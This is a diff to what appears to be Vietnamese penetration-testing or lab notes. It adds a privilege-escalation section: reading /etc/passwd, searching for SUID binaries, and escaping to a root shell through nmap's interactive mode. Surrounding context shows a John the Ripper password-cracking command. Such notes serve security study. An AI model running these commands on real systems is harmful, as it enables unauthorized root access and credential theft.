@@ -90,9 +90,28 @@ john --wordlist=rockyou.txt --format=nt hashes.txt
 
 ## Test đăng nhập
 
-## Thăng 
+- Xem người dùng trong hệ thống
+```
+cat /etc/passwd
+```
 
+## Thăng Quyền
 
+```
+find / -perm -4000 -type f 2>/dev/null
+```
+
+```
+/usr/bin/nmap --interactive
+```
+
+```
+!sh
+```
+
+```
+whoami
+```
 ## Tạo thư mục
 ```
 mkdir haidang
